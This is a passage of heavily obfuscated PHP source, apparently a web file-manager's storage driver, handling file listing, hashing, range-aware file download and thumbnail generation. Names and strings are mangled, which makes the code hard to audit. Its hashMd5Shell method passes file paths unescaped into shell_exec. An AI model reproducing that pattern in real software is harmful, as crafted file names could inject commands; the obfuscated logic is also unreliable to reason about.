(substr($ÎÙ‹çò›[$°ÉˆæÕø[87]], 0, strlen($Ü­åÙŞĞ)) == $Ü­åÙŞĞ) { $÷ â¤ı¥ = substr($÷ â¤ı¥, strlen($Ü­åÙŞĞ)); } $this->listAllMake($÷ â¤ı¥, $«¸¢’¾¹); } } public function listAllSimple($Ú×Æ±‰‹, $ëşé×ñÃ = false) { $õÜ‚×Ñ¿ = $this->listAll($Ú×Æ±‰‹); return $this->listAllSimpleMake($õÜ‚×Ñ¿, $this->getPathOuter($Ú×Æ±‰‹), $ëşé×ñÃ); } public function listAllSimpleMake($’ñŒüš, $Ìš¯ñ², $‡±·ºÑç) { $•ÙĞ»À‘ =& $_SERVER[óÔë„ú]; $‚ó»ôÕ­ = array(); $Ìš¯ñ² = rtrim(get_path_father($Ìš¯ñ²), $•ÙĞ»À‘[8]) . $•ÙĞ»À‘[8]; foreach ($’ñŒüš as $ÛòÎ£“€) { $ìÄ›È£ğ = array($•ÙĞ»À‘[87] => $ÛòÎ£“€[$•ÙĞ»À‘[87]], $•ÙĞ»À‘[89] => $ÛòÎ£“€[$•ÙĞ»À‘[87]], $•ÙĞ»À‘[78] => $ÛòÎ£“€[$•ÙĞ»À‘[78]]); if (isset($ÛòÎ£“€[$•ÙĞ»À‘[79]]) && !$ÛòÎ£“€[$•ÙĞ»À‘[78]]) { $ìÄ›È£ğ[$•ÙĞ»À‘[79]] = $ÛòÎ£“€[$•ÙĞ»À‘[79]]; } if (isset($ÛòÎ£“€[$•ÙĞ»À‘[88]])) { $ìÄ›È£ğ[$•ÙĞ»À‘[88]] = $ÛòÎ£“€[$•ÙĞ»À‘[88]]; } if (is_array($ÛòÎ£“€[$•ÙĞ»À‘[90]])) { $ìÄ›È£ğ[$•ÙĞ»À‘[89]] = $ÛòÎ£“€[$•ÙĞ»À‘[90]][$•ÙĞ»À‘[87]]; $ìÄ›È£ğ[$•ÙĞ»À‘[79]] = $ÛòÎ£“€[$•ÙĞ»À‘[90]][$•ÙĞ»À‘[79]]; $ìÄ›È£ğ[$•ÙĞ»À‘[88]] = $ÛòÎ£“€[$•ÙĞ»À‘[90]][$•ÙĞ»À‘[88]]; } else { if (substr($ÛòÎ£“€[$•ÙĞ»À‘[87]], 0, strlen($Ìš¯ñ²)) == $Ìš¯ñ²) { $ìÄ›È£ğ[$•ÙĞ»À‘[87]] = substr($ÛòÎ£“€[$•ÙĞ»À‘[87]], strlen($Ìš¯ñ²)); } } $©à«ÎÆ¹ = $ÛòÎ£“€[$•ÙĞ»À‘[78]] ? $•ÙĞ»À‘[8] : $•ÙĞ»À‘[12]; $ìÄ›È£ğ[$•ÙĞ»À‘[89]] = rtrim($ìÄ›È£ğ[$•ÙĞ»À‘[89]], $•ÙĞ»À‘[8]) . $©à«ÎÆ¹; $ìÄ›È£ğ[$•ÙĞ»À‘[87]] = $•ÙĞ»À‘[8] . trim($ìÄ›È£ğ[$•ÙĞ»À‘[87]], $•ÙĞ»À‘[8]) . $©à«ÎÆ¹; if (!$‡±·ºÑç) { $ÃĞŒƒ›û = explode($•ÙĞ»À‘[8], trim($ìÄ›È£ğ[$•ÙĞ»À‘[87]], $•ÙĞ»À‘[8])); $ìÄ›È£ğ[$•ÙĞ»À‘[87]] = $•ÙĞ»À‘[8] . implode($•ÙĞ»À‘[8], array_slice($ÃĞŒƒ›û, 1)) . $©à«ÎÆ¹; } $‚ó»ôÕ­[] = $ìÄ›È£ğ; } return array_sort_by($‚ó»ôÕ­, $•ÙĞ»À‘[87]); } public function upload($ÄÉ‰ş’ã, $®ëŞ…©Í, $ºµËÎÊ = false, $š€§×èò = REPEAT_REPLACE) { } public function uploadFileByID($À©‡å, $ğì§çÔ, $üì–ßü¦) { } public function uploadFileByPath($Ş•Æ±…ò, $ŸÌœê¼, $‚´‡Šı = array()) { } public function isUploadServer() { $õªÙ¯›Ñ =& $_SERVER[óÔë„ú]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $õªÙ¯›Ñ[91]) { return !0; } return $GLOBALS[$õªÙ¯›Ñ[6]][$õªÙ¯›Ñ[92]][$õªÙ¯›Ñ[93]]; } public function isFileOutServer() { $š÷ÏÅ© =& $_SERVER[óÔë„ú]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $š÷ÏÅ©[91]) { return !0; } return $GLOBALS[$š÷ÏÅ©[6]][$š÷ÏÅ©[92]][$š÷ÏÅ©[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($Ïœù»Î´) { $»šÁ¥¹‘ =& $_SERVER[óÔë„ú]; if (!$this->isCdnHost()) { return $Ïœù»Î´; } return str_replace(trim(get_url_root($Ïœù»Î´), $»šÁ¥¹‘[8]), trim($this->cdnHost, $»šÁ¥¹‘[8]), $Ïœù»Î´); } public function uploadLink($¶Ä—£¹ü, $Û¨×û® = 0) { $é¾«Áˆ¿ =& $_SERVER[óÔë„ú]; if ($this->isUploadServer()) { return; } $¨÷¹õ±‚ = $this->getType(); if (!in_array($¨÷¹õ±‚, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ìÛÆº£ = 1024 * 1024 * 10; $‘²‚ËÕğ = $Û¨×û® <= $ìÛÆº£ ? $é¾«Áˆ¿[95] : $é¾«Áˆ¿[96]; $‘üÑÀˆ˜ = (!$Û¨×û® ? 1 : ceil($Û¨×û® / pow(1024, 3))) * 3600 * 4; $ÁÆ°øÙ‰ = $this->{$‘²‚ËÕğ}($¶Ä—£¹ü, $‘üÑÀˆ˜); if ($ÁÆ°øÙ‰) { $ÁÆ°øÙ‰[$é¾«Áˆ¿[97]] = $¶Ä—£¹ü; $ÁÆ°øÙ‰[$é¾«Áˆ¿[98]] = $¨÷¹õ±‚; } return $ÁÆ°øÙ‰; } public function uploadFormData($“õ½ıõÎ, $ÆÙ“¥Ş¨ = 3600) { } public function multiUploadFormData($òÊ­²Ñú, $¨”¸Üâ‘ = 3600) { } public function download($¹Îá¨ç¢, $šÔõñ„ì) { } public function ext($…Æ–³¬) { $ßÛ¶‰îÚ =& $_SERVER[óÔë„ú]; if (strpos($…Æ–³¬, $ßÛ¶‰îÚ[8]) === -1) { $á¯ÇŞ§™ = $…Æ–³¬; } else { $á¯ÇŞ§™ = $this->pathThis($…Æ–³¬); } $¿õ–Ò†ø = $ßÛ¶‰îÚ[12]; if (strstr($á¯ÇŞ§™, $ßÛ¶‰îÚ[10])) { $¿õ–Ò†ø = substr($á¯ÇŞ§™, strrpos($á¯ÇŞ§™, $ßÛ¶‰îÚ[10]) + 1); $¿õ–Ò†ø = strtolower($¿õ–Ò†ø); } if (strlen($¿õ–Ò†ø) > 3 && preg_match($ßÛ¶‰îÚ[99], $¿õ–Ò†ø, $óïüšÃ“)) { $¿õ–Ò†ø = $ßÛ¶‰îÚ[12]; } return $¿õ–Ò†ø; } public function pathThis($±ŒŸ°–¢) { $¿ß•ğõ =& $_SERVER[óÔë„ú]; $±ŒŸ°–¢ = str_replace($¿ß•ğõ[100], $¿ß•ğõ[8], rtrim($±ŒŸ°–¢, $¿ß•ğõ[8])); $ÀÇ˜ãÌĞ = strrpos($±ŒŸ°–¢, $¿ß•ğõ[8]); if ($ÀÇ˜ãÌĞ === !1) { return $±ŒŸ°–¢; } return substr($±ŒŸ°–¢, $ÀÇ˜ãÌĞ + 1); } public function pathFather($±°÷ƒÁ) { $º€³ß¸È =& $_SERVER[óÔë„ú]; $±°÷ƒÁ = str_replace($º€³ß¸È[100], $º€³ß¸È[8], rtrim($±°÷ƒÁ, $º€³ß¸È[8])); $ùÄ…¹ô‡ = strrpos($±°÷ƒÁ, $º€³ß¸È[8]); if ($ùÄ…¹ô‡ === !1) { return $º€³ß¸È[12]; } return substr($±°÷ƒÁ, 0, $ùÄ…¹ô‡ + 1); } public function hashSimple($ñıäó­­) { $˜ú¥šÓ€ =& $_SERVER[óÔë„ú]; if (!$ñıäó­­) { return md5($˜ú¥šÓ€[12]); } $†İ“º = $this->size($ñıäó­­); $îÒÊëæ“ = 200; $ûÙìÊ©ˆ = 50; if ($†İ“º <= $îÒÊëæ“ * $ûÙìÊ©ˆ) { return $this->hashMd5($ñıäó­­) . $†İ“º; } $Æµª°ÎÖ = intval($†İ“º / $ûÙìÊ©ˆ); $±åïê¯á = $˜ú¥šÓ€[12]; for ($ˆÀ””ß¸ = 0; $ˆÀ””ß¸ < $ûÙìÊ©ˆ; $ˆÀ””ß¸++) { $±åïê¯á .= $this->fileSubstr($ñıäó­­, $Æµª°ÎÖ * $ˆÀ””ß¸, $îÒÊëæ“); } $±åïê¯á .= $this->fileSubstr($ñıäó­­, $†İ“º - $îÒÊëæ“, $îÒÊëæ“); return md5($±åïê¯á) . $†İ“º; } public static $md5Cache = array(); public function hashMd5($ğ³‡¼ÒĞ) { if (!$ğ³‡¼ÒĞ) { return md5($_SERVER[óÔë„ú][12]); } $ğ³‡¼ÒĞ = $this->iconvSystem($ğ³‡¼ÒĞ); if (isset(self::$md5Cache[$ğ³‡¼ÒĞ])) { return self::$md5Cache[$ğ³‡¼ÒĞ]; } self::$md5Cache[$ğ³‡¼ÒĞ] = $this->hashMd5Shell($ğ³‡¼ÒĞ); if (!self::$md5Cache[$ğ³‡¼ÒĞ]) { self::$md5Cache[$ğ³‡¼ÒĞ] = @md5_file($ğ³‡¼ÒĞ); } return self::$md5Cache[$ğ³‡¼ÒĞ]; } private function hashMd5Shell($ï“Ã·Ñğ) { $¯Åô¼®ã =& $_SERVER[óÔë„ú]; if (!$ï“Ã·Ñğ) { return md5($¯Åô¼®ã[12]); } if (!function_exists($¯Åô¼®ã[101])) { return !1; } $¾üç‰µ¼ = array($¯Åô¼®ã[102], $¯Åô¼®ã[103]); $úµö¤Œ· = Cache::get($¯Åô¼®ã[104]); if (!$úµö¤Œ·) { $ôõœ”Æ— = BASIC_PATH . $¯Åô¼®ã[105]; $¥Û€ÜËÓ = md5_file($ôõœ”Æ—); $úµö¤Œ· = $¯Åô¼®ã[106]; foreach ($¾üç‰µ¼ as $àÌŞ…¿Ğ) { $¾ş·ìòí = shell_exec($àÌŞ…¿Ğ . "\x20\x22{$ôõœ”Æ—}\42"); if ($¾ş·ìòí && substr(trim($¾ş·ìòí), 0, 32) == $¥Û€ÜËÓ) { $úµö¤Œ· = $àÌŞ…¿Ğ; break; } } Cache::set($¯Åô¼®ã[104], $úµö¤Œ·, 3600); } if ($úµö¤Œ· == $¯Åô¼®ã[106]) { return !1; } $¾ş·ìòí = shell_exec($úµö¤Œ· . "\40\x22{$ï“Ã·Ñğ}\42"); $¾ş·ìòí = str_replace($¯Åô¼®ã[107], $¯Åô¼®ã[12], $¾ş·ìòí); return substr($¾ş·ìòí, 0, 32); } public function link($èÍÓÙ”£) { return $èÍÓÙ”£; } public function fileOut($ñ“Ó¦„, $–Ôõæú¢ = false, $éá‹Îèâ = false, $‘· ¹ƒù = '') { $¦³“†Àç =& $_SERVER[óÔë„ú]; $this->cacheMethod(null, null); if (!$ñ“Ó¦„ || !$this->exist($ñ“Ó¦„)) { show_json(LNG($¦³“†Àç[108]), !1, $éá‹Îèâ); } $™¦ ×’ƒ = $this->getType() == $¦³“†Àç[109]; $Ëô³êÔï = $GLOBALS[$¦³“†Àç[6]][$¦³“†Àç[92]][$¦³“†Àç[110]][$¦³“†Àç[111]]; $Ò™ÜÒ£– = (double) $GLOBALS[$¦³“†Àç[6]][$¦³“†Àç[92]][$¦³“†Àç[110]][$¦³“†Àç[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ŠúşÒĞ = $this->infoFull($ñ“Ó¦„); $¡³¹š×Ü = $ŠúşÒĞ[$¦³“†Àç[79]]; $æöç¢¤ø = gmdate($¦³“†Àç[113], $ŠúşÒĞ[$¦³“†Àç[88]]); $†š˜º’ = $éá‹Îèâ ? $éá‹Îèâ : $this->iconvApp($ŠúşÒĞ[$¦³“†Àç[32]]); $ÆôìÊÍã = 0; $Ğ‰ñïé = $¡³¹š×Ü - 1; $²·Ê÷†¬ = $this->ext($†š˜º’); if (in_array($²·Ê÷†¬, array($¦³“†Àç[114], $¦³“†Àç[115], $¦³“†Àç[116], $¦³“†Àç[117]))) { $²·Ê÷†¬ = $¦³“†Àç[118]; } if (in_array($²·Ê÷†¬, array($¦³“†Àç[119]))) { $²·Ê÷†¬ = $¦³“†Àç[120]; } if (!$‘· ¹ƒù) { $‘· ¹ƒù = md5($æöç¢¤ø . $¡³¹š×Ü); } $‘· ¹ƒù = $¦³“†Àç[121] . $‘· ¹ƒù . $¦³“†Àç[121]; $Å³’ÅäÔ = get_file_mime($²·Ê÷†¬); $ìåÂÑš‡ = !0; $ìåÂÑš‡ = isset($_GET[$¦³“†Àç[122]]) ? !1 : !0; if ($–Ôõæú¢ === !1 && !mime_support($Å³’ÅäÔ)) { $Å³’ÅäÔ = $¦³“†Àç[123]; } header($¦³“†Àç[124]); header($¦³“†Àç[125] . $Å³’ÅäÔ); $¢¨Ğ¦É¤ = rawurlencode($†š˜º’); $¢¨Ğ¦É¤ = $¦³“†Àç[121] . $¢¨Ğ¦É¤ . $¦³“†Àç[126] . $¢¨Ğ¦É¤; if ($–Ôõæú¢) { header($¦³“†Àç[127]); header($¦³“†Àç[128] . $¢¨Ğ¦É¤); } else { if ($ìåÂÑš‡) { header($¦³“†Àç[129] . $¢¨Ğ¦É¤); } } $“å¾ÃçÂ = 3600 * 24 * 30; header($¦³“†Àç[130]); header($¦³“†Àç[131]); header($¦³“†Àç[132] . $“å¾ÃçÂ); header($¦³“†Àç[133] . gmdate($¦³“†Àç[113], time() + $“å¾ÃçÂ) . $¦³“†Àç[134]); if (isset($_SERVER[$¦³“†Àç[135]]) && strtotime($_SERVER[$¦³“†Àç[135]]) == $ŠúşÒĞ[$¦³“†Àç[88]]) { header($¦³“†Àç[136], !0, 304); die; } if (isset($_SERVER[$¦³“†Àç[137]]) && $_SERVER[$¦³“†Àç[137]] == $‘· ¹ƒù) { header($¦³“†Àç[138] . $‘· ¹ƒù, !0, 304); die; } header($¦³“†Àç[138] . $‘· ¹ƒù); header($¦³“†Àç[139] . $æöç¢¤ø . $¦³“†Àç[134]); header($¦³“†Àç[140] . $†š˜º’); header($¦³“†Àç[141]); header($¦³“†Àç[142] . $¡³¹š×Ü); header($¦³“†Àç[143]); Hook::trigger($¦³“†Àç[144], $ñ“Ó¦„, $¡³¹š×Ü, $†š˜º’, $²·Ê÷†¬); if (!$–Ôõæú¢ && $²·Ê÷†¬ == $¦³“†Àç[145]) { if ($¡³¹š×Ü > 1024 * 1024 * 5) { die; } $­úõ“úú = $this->getContent($ñ“Ó¦„); $­úõ“úú = Html::clearSVG($­úõ“úú); header($¦³“†Àç[146] . strlen($­úõ“úú)); echo $­úõ“úú; die; } $½ÈÁÛœà = strtolower($_SERVER[$¦³“†Àç[147]]); if ($™¦ ×’ƒ && $½ÈÁÛœà && $Ëô³êÔï) { if (strstr($½ÈÁÛœà, $¦³“†Àç[148])) { header($¦³“†Àç[149] . $ñ“Ó¦„); } else { if (strstr($½ÈÁÛœà, $¦³“†Àç[150])) { header($¦³“†Àç[151] . $ñ“Ó¦„); } else { if (strstr($½ÈÁÛœà, $¦³“†Àç[152])) { header($¦³“†Àç[153] . $ñ“Ó¦„); } } } if ($Ò™ÜÒ£–) { header($¦³“†Àç[154] . $Ò™ÜÒ£–); } return; } if (isset($_SERVER[$¦³“†Àç[155]])) { if (preg_match($¦³“†Àç[156], $_SERVER[$¦³“†Àç[155]], $‚öŸî )) { $ÆôìÊÍã = intval($‚öŸî [1]); $ÆôìÊÍã = $ÆôìÊÍã <= 0 ? 0 : ($ÆôìÊÍã >= $Ğ‰ñïé ? $Ğ‰ñïé : $ÆôìÊÍã); if (!empty($‚öŸî [2])) { $êôö³‰ = intval($‚öŸî [2]); $Ğ‰ñïé = $êôö³‰ < $ÆôìÊÍã ? $ÆôìÊÍã : ($êôö³‰ >= $Ğ‰ñïé ? $Ğ‰ñïé : $êôö³‰); } } header($¦³“†Àç[157]); header("\103\157\156\164\145\x6e\164\55\122\x61\x6e\x67\x65\x3a\40\142\x79\164\x65\163\x20{$ÆôìÊÍã}\x2d{$Ğ‰ñïé}\57" . $¡³¹š×Ü); } else { header($¦³“†Àç[158]); } header($¦³“†Àç[159]); header($¦³“†Àç[160]); $Êœø‘´ò = !0; if ($_SERVER[$¦³“†Àç[161]] == $¦³“†Àç[162] && $¡³¹š×Ü > 1204 * 1024 * 1024 * 2) { $Êœø‘´ò = !1; } if ($Êœø‘´ò) { header($¦³“†Àç[163] . ($Ğ‰ñïé - $ÆôìÊÍã + 1)); } if ($_SERVER[$¦³“†Àç[164]] == $¦³“†Àç[165]) { return; } $Ôí‡ÀŸ = array($¦³“†Àç[166] => !1, $¦³“†Àç[167] => $ÆôìÊÍã, $¦³“†Àç[168] => $Ğ‰ñïé, $¦³“†Àç[169] => $²·Ê÷†¬, $¦³“†Àç[170] => $ŠúşÒĞ, $¦³“†Àç[171] => $¦³“†Àç[12], $¦³“†Àç[172] => 0); $Ôí‡ÀŸ = Hook::filter($¦³“†Àç[173], $Ôí‡ÀŸ); $íÏ–ãßÊ = 1024 * 300; $ÊîÂ˜«£ = 0; if ($Ò™ÜÒ£–) { $ÊîÂ˜«£ = intval(1000 * 1000 * ($íÏ–ãßÊ / $Ò™ÜÒ£–)); } while ($ÆôìÊÍã <= $Ğ‰ñïé) { $ƒÂÌÎ’ƒ = timeFloat(); check_abort(); $ìûüã’Î = $Ğ‰ñïé - $ÆôìÊÍã + 1; if ($ìûüã’Î <= $íÏ–ãßÊ) { $íÏ–ãßÊ = $ìûüã’Î; } $­úõ“úú = $this->fileSubstr($ñ“Ó¦„, $ÆôìÊÍã, $íÏ–ãßÊ); if ($Ôí‡ÀŸ[$¦³“†Àç[166]]) { $Ôí‡ÀŸ[$¦³“†Àç[171]] = $­úõ“úú; $Ôí‡ÀŸ[$¦³“†Àç[172]] = $ÆôìÊÍã; $Ôí‡ÀŸ = Hook::filter($¦³“†Àç[174], $Ôí‡ÀŸ); $­úõ“úú = $Ôí‡ÀŸ[$¦³“†Àç[171]]; } echo $­úõ“úú; $ÆôìÊÍã += $íÏ–ãßÊ; if ($íÏ–ãßÊ == $ìûüã’Î) { $ÆôìÊÍã = $Ğ‰ñïé + 1; } if ($ÊîÂ˜«£) { $É‹ù­ğÕ = intval(1000 * 1000 * (timeFloat() - $ƒÂÌÎ’ƒ)); $Ùˆµ¸ã = $ÊîÂ˜«£ - $É‹ù­ğÕ; if ($Ùˆµ¸ã > 5) { usleep($Ùˆµ¸ã); } } } } public function fileOutServer($¶ğ–Ó‰ˆ, $ÙïÆÊ¤– = false, $®ş«ø½Ø = false, $¸½çÂÎ = '') { $this->fileOut($¶ğ–Ó‰ˆ, $ÙïÆÊ¤–, $®ş«ø½Ø, $¸½çÂÎ); } public function fileOutLink($â™¾¹) { header($_SERVER[óÔë„ú][175] . $â™¾¹); die; } public function cacheMethod($¦Éì÷Á, $¼‡ˆŠ·º, $Úöíğâù = null) { $ÜÙàÈ¾· =& $_SERVER[óÔë„ú]; static $Œ¿¿ÉÔ¡ = array(); $—˜Øç½ = $¼‡ˆŠ·º ? ltrim($this->getPathOuter($¼‡ˆŠ·º), $ÜÙàÈ¾·[8]) : $ÜÙàÈ¾·[12]; $¢œ­†ïÒ = $ÜÙàÈ¾·[176] . $¦Éì÷Á . $ÜÙàÈ¾·[177] . rtrim($—˜Øç½, $ÜÙàÈ¾·[8]); if (is_null($¦Éì÷Á)) { $Œ¿¿ÉÔ¡ = array(); return; } if (is_null($¼‡ˆŠ·º)) { foreach ($Œ¿¿ÉÔ¡ as $¢œ­†ïÒ => $ìÂÜ×Êµ) { if (!strstr($¢œ­†ïÒ, $ÜÙàÈ¾·[176] . $¦Éì÷Á . $ÜÙàÈ¾·[178])) { continue; } unset($Œ¿¿ÉÔ¡[$¢œ­†ïÒ]); } return; } if (!is_null($Úöíğâù)) { $Œ¿¿ÉÔ¡[$¢œ­†ïÒ] = $Úöíğâù; return; } $ñÀüãÍ = isset($Œ¿¿ÉÔ¡[$¢œ­†ïÒ]) ? $Œ¿¿ÉÔ¡[$¢œ­†ïÒ] : null; if (!is_null($ñÀüãÍ)) { return $ñÀüãÍ; } $ñÀüãÍ = $this->{$¦Éì÷Á}($¼‡ˆŠ·º); $Œ¿¿ÉÔ¡[$¢œ­†ïÒ] = $ñÀüãÍ; return $ñÀüãÍ; } public function cacheMethodInfoSet($ãùá³Â¥, $ã£¨«Ïò, $¾æ´ßé« = false) { $ÄÑÏ¯ß =& $_SERVER[óÔë„ú]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($ÄÑÏ¯ß[179], $ãùá³Â¥, $ã£¨«Ïò); $this->cacheMethod($ÄÑÏ¯ß[180], $ãùá³Â¥, $ã£¨«Ïò ? !1 : !0); if (is_array($¾æ´ßé«)) { $this->cacheMethod($ÄÑÏ¯ß[181], $ãùá³Â¥, $¾æ´ßé«); } } public function fileOutImage($š¡¯åğÑ, $ ‡ù‹ñÙ = 250) { $ø—üÉ¾— =& $_SERVER[óÔë„ú]; set_timeout(); if (substr($š¡¯åğÑ, 0, 4) == $ø—üÉ¾—[152]) { $this->fileOutLink($š¡¯åğÑ); } $Ó«²ƒøÎ = $this->info($š¡¯åğÑ); $Ş­óœÏ = !1; $úÉã«ê = isset($GLOBALS[$ø—üÉ¾—[182]]) ? $GLOBALS[$ø—üÉ¾—[182]] : array(); if ($úÉã«ê && $úÉã«ê[$ø—üÉ¾—[183]] == $Ó«²ƒøÎ[$ø—üÉ¾—[87]]) { $Ó«²ƒøÎ = $úÉã«ê; $óŠ®‡ñü = $Ó«²ƒøÎ[$ø—üÉ¾—[184]]; if ($óŠ®‡ñü && isset($óŠ®‡ñü[$ø—üÉ¾—[185]])) { if ($óŠ®‡ñü[$ø—üÉ¾—[185]] <= $ ‡ù‹ñÙ && $óŠ®‡ñü[$ø—üÉ¾—[186]] <= $ ‡ù‹ñÙ) { $Ş­óœÏ = !0; } } } if ($Ó«²ƒøÎ[$ø—üÉ¾—[79]] <= 1024 * 50 || $Ş­óœÏ || !function_exists($ø—üÉ¾—[187]) || $Ó«²ƒøÎ[$ø—üÉ¾—[169]] == $ø—üÉ¾—[188]) { return $this->fileOut($š¡¯åğÑ, !1, $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); } $´ŠĞ€‘² = kodIO::hashPath($Ó«²ƒøÎ); $Ã™¡’¡ = "\143\157\166\145\x72\x5f{$´ŠĞ€‘²}\x5f{$ ‡ù‹ñÙ}\x2e\160\156\147"; $ŠñÆëÎ– = IO_PATH_SYSTEM_TEMP . $ø—üÉ¾—[189]; $Ê©²¹ø = IO::infoFullSimple($ŠñÆëÎ–); $äˆé¾… = $Ê©²¹ø && is_array($Ê©²¹ø) ? $Ê©²¹ø[$ø—üÉ¾—[87]] : $ø—üÉ¾—[12]; if (!$äˆé¾…) { $äˆé¾… = IO::mkdir($ŠñÆëÎ–); } if ($Ó«²ƒøÎ[$ø—üÉ¾—[190]] == $ø—üÉ¾—[191] && isset($Ó«²ƒøÎ[$ø—üÉ¾—[192]]) && $Ó«²ƒøÎ[$ø—üÉ¾—[192]] == kodIO::sourceID($äˆé¾…)) { $ˆÌÜêä = $Ó«²ƒøÎ[$ø—üÉ¾—[193]]; if ($ ‡ù‹ñÙ <= 500) { $×Ê¡Ş²Ë = preg_replace($ø—üÉ¾—[194], $ø—üÉ¾—[195], $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); $ˆÌÜêä = IO::fileNameExist($äˆé¾…, $×Ê¡Ş²Ë); } return IO::fileOut(KodIO::make($ˆÌÜêä), !1, $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); } $ÆÑ¬«Üœ = IO::fileNameExist($äˆé¾…, $Ã™¡’¡); if ($ÆÑ¬«Üœ) { return IO::fileOut(KodIO::make($ÆÑ¬«Üœ), !1, $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); } if ($ ‡ù‹ñÙ > 1000) { $this->makeImageCover($äˆé¾…, $š¡¯åğÑ, $Ã™¡’¡, $ ‡ù‹ñÙ); $this->makeImageCover($äˆé¾…, $š¡¯åğÑ, "\x63\x6f\x76\x65\162\137{$´ŠĞ€‘²}\137\x32\65\x30\x2e\x70\x6e\147", 250); $ÆÑ¬«Üœ = IO::fileNameExist($äˆé¾…, $Ã™¡’¡); if ($ÆÑ¬«Üœ) { return IO::fileOut(KodIO::make($ÆÑ¬«Üœ), !1, $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); } die; } if (!kodIO::allowCover($Ó«²ƒøÎ)) { return $this->fileOut($š¡¯åğÑ, !1, $Ó«²ƒøÎ[$ø—üÉ¾—[32]]); } $ºœÓ“èï = Cache::get($Ã™¡’¡); if ($ºœÓ“èï == $ø—üÉ¾—[196] || $ºœÓ“èï == $ø—üÉ¾—[197]) { echo $ºœÓ“èï; die; } Cache::set($Ã™¡’¡, $ø—üÉ¾—[197], 60); $ş³ÓŞ»¦ = array($äˆé¾…, $Ó«²ƒøÎ[$ø—üÉ¾—[87]], $Ã™¡’¡, $ ‡ù‹ñÙ); $½´ÜŸ—¨ = $ø—üÉ¾—[198] . $Ó«²ƒøÎ[$ø—üÉ¾—[79]] . $ø—üÉ¾—[199] . $Ã™¡’¡ . $ø—üÉ¾—[200] . $Ó«²ƒøÎ[$ø—üÉ¾—[32]] . $ø—üÉ¾—[201] . $Ó«²ƒøÎ[$ø—üÉ¾—[87]]; TaskQueue::add($ø—üÉ¾—[202], $ş³ÓŞ»¦, $½´ÜŸ—¨, $Ã™¡’¡); } public function makeImageCover($Ô¶ùˆÃ™, $ñù¿ıš¢, $²çÍ©«ı, $×†ûî²‰) { $Î¯¤İˆ÷ =& $_SERVER[óÔë„ú]; if (IO::fileNameExist($Ô¶ùˆÃ™, $²çÍ©«ı)) { return $Î¯¤İˆ÷[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ƒŞû„®° = DATA_THUMB . $²çÍ©«ı; del_file($ƒŞû„®°); $£‘õ¼ó» = IO::copy($ñù¿ıš¢, TEMP_FILES, !1, $²çÍ©«ı); if (!@file_exists($£‘õ¼ó»)) { return $Î¯¤İˆ÷[204]; } ImageThumb::createThumb($£‘õ¼ó», $ƒŞû„®°, $×†ûî²‰, $×†ûî²‰ * 10); if (@file_exists($ƒŞû„®°)) { Cache::remove($²çÍ©«ı); return IO::move($ƒŞû„®°, $Ô¶ùˆÃ™); } Cache::set($²çÍ©«ı, $Î¯¤İˆ÷[196], 600); del_file($ƒŞû„®°); return $Î¯¤İˆ÷[205] . $£‘õ¼ó» . $Î¯¤İˆ÷[74]; } public function fileOutImageServer($Ş‰É¡›, $Œ’ĞÓà† = 250) { $this->fileOutImage($Ş‰É¡›, $Œ’ĞÓà†); } public function fileNameAuto($Õ„Áâîç, $öŠš™®ò, $™»Œ«áš = REPEAT_RENAME, $´¬ô‚Ş÷ = false) { $’®“É˜Ë =& $_SERVER[óÔë„ú]; $¡Ê¹ÔÛ‚ = $Õ„Áâîç === $’®“É˜Ë[12] ? $öŠš™®ò : rtrim($Õ„Áâîç, $’®“É˜Ë[8]) . $’®“É˜Ë[8] . $öŠš™®ò; if ($™»Œ«áš == REPEAT_REPLACE || !$this->exist($¡Ê¹ÔÛ‚) || $´¬ô‚Ş÷ && $™»Œ«áš != REPEAT_RENAME_FOLDER) { return $öŠš™®ò; } if ($™»Œ«áš == REPEAT_SKIP) { return !1; } $šÃß®’¸ = $’®“É˜Ë[10] . get_path_ext($öŠš™®ò); $šÃß®’¸ = $šÃß®’¸ == $’®“É˜Ë[10] || $´¬ô‚Ş÷ ? $’®“É˜Ë[12] : $šÃß®’¸; $ì—ú•†â = 1; $×‹×¼ƒÓ = substr($öŠš™®ò, 0, strlen($öŠš™®ò) - strlen($šÃß®’¸)); $òüóŞ–ù = $×‹×¼ƒÓ . "\x28{$ì—ú•†â}\x29{$šÃß®’¸}"; while ($this->exist(rtrim($Õ„Áâîç, $’®“É˜Ë[8]) . $’®“É˜Ë[8] . $òüóŞ–ù)) { $òüóŞ–ù = $×‹×¼ƒÓ . "\x28{$ì—ú•†â}\x29{$šÃß®’¸}"; $ì—ú•†â++; } return $òüóŞ–ù; } private function fileNameAutoList($»Ê·Ñİ, $¾ñ“±, $ú™¾¯à = false) { $»¢à×¥Á =& $_SERVER[óÔë„ú]; $Ø¿«Êë± = $this->listPath($»Ê·Ñİ, !0); $Ø¿«Êë± = array_merge($Ø¿«Êë±[$»¢à×¥Á[85]], $Ø¿«Êë±[$»¢à×¥Á[86]]); $¸‰¡‹Ÿù = array_to_keyvalue($Ø¿«Êë±, $»¢à×¥Á[12], $»¢à×¥Á[32]); $¶ßô‹†ê = $»¢à×¥Á[10] . get_path_ext($¾ñ“±); $¶ßô‹†ê = $¶ßô‹†ê == $»¢à×¥Á[10] || $ú™¾¯à ? $»¢à×¥Á[12] : $¶ßô‹†ê; $ò¼–Šª™ = substr($¾ñ“±, 0, strlen($¾ñ“±) - strlen($¶ßô‹†ê)); $®æ¸É×Œ = $ò¼–Šª™ . "\x28\x30\51{$¶ßô‹†ê}"; for ($µàÙ­¯ç = 1; $µàÙ­¯ç <= count($¸‰¡‹Ÿù) + 1; $µàÙ­¯ç++) { $®æ¸É×Œ = $ò¼–Šª™ . "\50{$µàÙ­¯ç}\x29{$¶ßô‹†ê}"; if (!in_array_not_case($®æ¸É×Œ, $¸‰¡‹Ÿù)) { return $®æ¸É×Œ; } } return $®æ¸É×Œ; } public function listAllFiles($¢„ƒºí, 